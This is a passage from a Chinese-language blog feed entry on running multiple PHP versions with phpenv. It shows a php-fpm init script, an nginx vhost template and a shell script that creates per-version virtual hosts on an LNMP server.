<p>然后刚才安装5.6.0版本的php, 安装目录在 <code>/root/.phpenv/versions/5.6.0</code></p>
<p>安装过程需要一系列函数库, 如果你电脑里没有则会报错</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#以下是我服务器需要的函数库</span><br><span class="line">$ sudo apt install libreadline6-<span class="built_in">dev</span> libtidy-<span class="built_in">dev</span> libxslt1-<span class="built_in">dev</span></span><br></pre></td></tr></table></figure>
<p>然后还会报如下错误:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ext/xmlrpc/libxmlrpc/.libs/encodings.o: <span class="keyword">In</span> <span class="keyword">function</span> `convert<span class="comment">':</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">73</span>: undefined reference <span class="keyword">to</span> `libiconv_open<span class="comment">'</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">81</span>: undefined reference <span class="keyword">to</span> `libiconv<span class="comment">'</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">101</span>: undefined reference <span class="keyword">to</span> `libiconv_close<span class="comment">'</span></span><br><span class="line">/tmp/php-build/source/<span class="number">5.6</span>.0/ext/xmlrpc/libxmlrpc/encodings.c:<span class="number">101</span>: undefined reference <span class="keyword">to</span> `libiconv_close<span class="comment">'</span></span><br></pre></td></tr></table></figure></p>
<p>查到的导致该错误的原因：<a href="http://tonybai.com/2013/04/25/a-libiconv-linkage-problem/" target="_blank" rel="external">http://tonybai.com/2013/04/25/a-libiconv-linkage-problem/</a><br>没有啥好的解决方法，临时解决方法是把<code>/usr/local/lib/libiconv.so</code>删除<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mv /usr/<span class="keyword">local</span>/<span class="keyword">include</span>/iconv.<span class="keyword">h</span> /usr/<span class="keyword">local</span>/<span class="keyword">include</span>/iconv.<span class="keyword">h</span>.bak</span><br></pre></td></tr></table></figure></p>
<p>然后改编了一下<code>php-fpm</code>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">$ cp /etc/init.d/php-fpm ./php-fpm.sh</span><br><span class="line">$ cat php-fpm.sh</span><br><span class="line"></span><br><span class="line"><span class="shebang">#! /bin/sh</span><br><span class="line"></span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides:          php-fpm</span></span><br><span class="line"><span class="comment"># Required-Start:    $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop:     $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:      0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: starts php-fpm</span></span><br><span class="line"><span class="comment"># Description:       starts the PHP FastCGI Process Manager daemon</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">prefix=/root/.phpenv/versions/<span class="variable">$2</span></span><br><span class="line"><span class="built_in">exec</span>_prefix=<span class="variable">$&#123;prefix&#125;</span></span><br><span class="line"></span><br><span class="line">php_fpm_BIN=<span class="variable">$&#123;exec_prefix&#125;</span>/sbin/php-fpm</span><br><span class="line">php_fpm_CONF=<span class="variable">$&#123;prefix&#125;</span>/etc/php-fpm.conf</span><br><span class="line">php_fpm_PID=<span class="variable">$&#123;prefix&#125;</span>/var/run/php-fpm.pid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php_opts=<span class="string">"--fpm-config <span class="variable">$php_fpm_CONF</span> --pid <span class="variable">$php_fpm_PID</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">wait_for_pid</span></span> () &#123;</span><br><span class="line">	try=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">test</span> <span class="variable">$try</span> <span class="operator">-lt</span> <span class="number">35</span> ; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">			<span class="string">'created'</span>)</span><br><span class="line">			<span class="keyword">if</span> [ <span class="operator">-f</span> <span class="string">"<span class="variable">$2</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">				try=<span class="string">''</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			;;</span><br><span class="line"></span><br><span class="line">			<span class="string">'removed'</span>)</span><br><span class="line">			<span class="keyword">if</span> [ ! <span class="operator">-f</span> <span class="string">"<span class="variable">$2</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">				try=<span class="string">''</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			;;</span><br><span class="line">		<span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> -n .</span><br><span class="line">		try=`expr <span class="variable">$try</span> + <span class="number">1</span>`</span><br><span class="line">		sleep <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">	start)</span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Starting php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$php_fpm_BIN</span> --daemonize <span class="variable">$php_opts</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ <span class="string">"$?"</span> != <span class="number">0</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">wait</span>_<span class="keyword">for</span>_pid created <span class="variable">$php_fpm_PID</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$try</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	stop)</span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Gracefully shutting down php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"warning, no pid file found - php-fpm is not running ?"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">kill</span> -QUIT `cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line"></span><br><span class="line">		<span class="built_in">wait</span>_<span class="keyword">for</span>_pid removed <span class="variable">$php_fpm_PID</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$try</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed. Use force-quit"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	status)</span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"php-fpm is stopped"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">0</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		PID=`cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line">		<span class="keyword">if</span> ps -p <span class="variable">$PID</span> | grep -q <span class="variable">$PID</span>; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"php-fpm (pid <span class="variable">$PID</span>) is running..."</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"php-fpm dead but pid file exists"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	force-quit)</span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Terminating php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"warning, no pid file found - php-fpm is not running ?"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">kill</span> -TERM `cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line"></span><br><span class="line">		<span class="built_in">wait</span>_<span class="keyword">for</span>_pid removed <span class="variable">$php_fpm_PID</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$try</span>"</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" failed"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	restart)</span><br><span class="line">		<span class="variable">$0</span> stop</span><br><span class="line">		<span class="variable">$0</span> start</span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	reload)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"Reload service php-fpm "</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ ! -r <span class="variable">$php_fpm_PID</span> ] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> <span class="string">"warning, no pid file found - php-fpm is not running ?"</span></span><br><span class="line">			<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">kill</span> -USR2 `cat <span class="variable">$php_fpm_PID</span>`</span><br><span class="line"></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">" done"</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	configtest)</span><br><span class="line">		<span class="variable">$php_fpm_BIN</span> -t</span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line">	*)</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|force-quit|restart|reload|status|configtest&#125;"</span></span><br><span class="line">		<span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">	;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure></p>
<p>参加以前虚拟主机的一键脚本需要改改<code>/bin/lnmp</code><br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;<span class="regexp">/usr/local</span><span class="regexp">/nginx/conf</span><span class="regexp">/vhost/</span><span class="variable">$&#123;</span>domain&#125;.conf&lt;&lt;<span class="constant">EOF</span></span><br><span class="line">server</span><br><span class="line">    &#123;</span><br><span class="line">        listen <span class="number">80</span>;</span><br><span class="line">        <span class="comment"># listen [::]:80;</span></span><br><span class="line">        server_name <span class="variable">$&#123;</span>domain&#125;<span class="variable">$&#123;</span>moredomainame&#125;;</span><br><span class="line">        index index.html index.htm index.php default.html default.htm default.php;</span><br><span class="line">        root  <span class="variable">$&#123;</span>vhostdir&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$&#123;</span>rewrite&#125;.conf;</span><br><span class="line">        <span class="comment"># error_page   404   /404.html;</span></span><br><span class="line">        <span class="comment"># include enable-php.conf;</span></span><br><span class="line"></span><br><span class="line">        location ~ [^<span class="regexp">/]\.php(/</span>|<span class="variable">$)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># comment try_files \$uri =404; to enable pathinfo</span></span><br><span class="line">            try_files \<span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">            fastcgi_pass  <span class="symbol">unix:</span>/tmp/php-cgi.sock;</span><br><span class="line">            fastcgi_index index.php;</span><br><span class="line">            <span class="keyword">include</span> fastcgi.conf;</span><br><span class="line">            <span class="comment"># include pathinfo.conf;</span></span><br><span class="line">        &#125;</span><br><span class="line">        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)<span class="variable">$</span><br><span class="line"></span>        &#123;</span><br><span class="line">            expires      <span class="number">30</span>d;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location ~ .*\.(js|css)?<span class="variable">$</span><br><span class="line"></span>        &#123;</span><br><span class="line">            expires      <span class="number">12</span>h;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$&#123;</span>al&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="constant">EOF</span></span><br></pre></td></tr></table></figure></p>
<p>然后写了一个一键生成相应php版本的虚拟主机: <code>diff_php_vhost_add.sh</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">"<span class="variable">$1</span>"</span> ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Please enter vhost name"</span>;</span><br><span class="line">        <span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">"<span class="variable">$2</span>"</span> ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Please enter php version"</span>;</span><br><span class="line">        <span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">groupadd <span class="variable">$1</span></span><br><span class="line">useradd <span class="variable">$1</span> -M <span class="operator">-s</span> /sbin/nologin -g <span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">cat &gt;/root/.phpenv/versions/<span class="variable">$2</span>/etc/php-fpm.conf&lt;&lt;EOF</span><br><span class="line">[global]</span><br><span class="line">pid = /root/.phpenv/versions/<span class="variable">$2</span>/var/run/php-fpm.pid</span><br><span class="line">error_<span class="built_in">log</span> = /root/.phpenv/versions/<span class="variable">$2</span>/var/<span class="built_in">log</span>/php-fpm.log</span><br><span class="line"><span class="built_in">log</span>_level = notice</span><br><span class="line"></span><br><span class="line">[<span class="variable">$1</span>]</span><br><span class="line">listen = /tmp/php-cgi-<span class="variable">$2</span>.sock</span><br><span class="line"><span class="comment">#listen = 127.0.0.1:9000</span></span><br><span class="line">listen.backlog = -<span class="number">1</span></span><br><span class="line">listen.allowed_clients = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">listen.owner = <span class="variable">$1</span></span><br><span class="line">listen.group = <span class="variable">$1</span></span><br><span class="line">listen.mode = <span class="number">0666</span></span><br><span class="line">user = <span class="variable">$1</span></span><br><span class="line">group = <span class="variable">$1</span></span><br><span class="line">pm = dynamic</span><br><span class="line">;pm = static</span><br><span class="line">pm.max_children = <span class="number">10</span></span><br><span class="line">pm.start_servers = <span class="number">2</span></span><br><span class="line">pm.min_spare_servers = <span class="number">1</span></span><br><span class="line">pm.max_spare_servers = <span class="number">6</span></span><br><span class="line">request_terminate_timeout = <span class="number">100</span></span><br><span class="line">request_slowlog_timeout = <span class="number">0</span></span><br><span class="line">slowlog = var/<span class="built_in">log</span>/slow-<span class="variable">$2</span>.log</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span> | lnmp vhost add</span><br><span class="line">chown <span class="variable">$1</span>:<span class="variable">$1</span> -R /home/wwwroot/<span class="variable">$1</span></span><br><span class="line">sed -i <span class="string">"s/php-cgi/php-cgi-<span class="variable">$2</span>/g"</span> /usr/<span class="built_in">local</span>/nginx/conf/vhost/<span class="variable">$1</span>.conf</span><br><span class="line"></span><br><span class="line">/root/php-fpm.sh restart <span class="variable">$2</span></span><br><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure></p>
<p>好了。。前期准备工作就好了, 以后增加特定版本php的虚拟主机只要两句命令<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ phpenv install [<span class="property">version</span>]     <span class="comment"># 安装相应版本的php</span></span><br><span class="line">$ ./diff_php_vhost_add.sh [vhost] [<span class="property">version</span>]  <span class="comment">#有两个参数, 第一个是虚拟主机名, 第二个是php版本号, 必需得已经使用phpenv安装成功的</span></span><br></pre></td></tr></table></figure></p>
<h2 id="最后">最后</h2><p>我的一键脚本路径都是写死的, 已经我是用来做测试的, 所以都放在<code>/root</code>目录下, 如果不用root的, 自己把脚本里的路径改成相应路径<br>下次有空自己写个和一键配合的lnmp脚本</p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/08/16/0x20/#disqus_comments</comments>
    </item>
    
  </channel>
</rss>